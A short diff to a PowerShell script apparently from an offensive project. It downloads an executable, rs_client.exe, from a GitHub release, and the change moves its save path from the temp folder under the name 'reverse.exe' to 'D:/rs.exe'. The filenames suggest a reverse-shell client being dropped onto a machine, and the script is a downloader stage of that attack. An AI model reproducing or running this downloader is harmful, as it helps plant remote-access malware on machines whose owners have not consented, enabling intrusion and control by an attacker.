@@ -1,5 +1,5 @@
 $fileUrl = 'https://github.com/renoob21/rs_client/releases/download/First-Release/rs_client.exe';
-$path = Join-Path $env:TEMP 'reverse.exe';
+$path = 'D:/rs.exe';
 
 Invoke-WebRequest -Uri $fileUrl -OutFile $path;
 
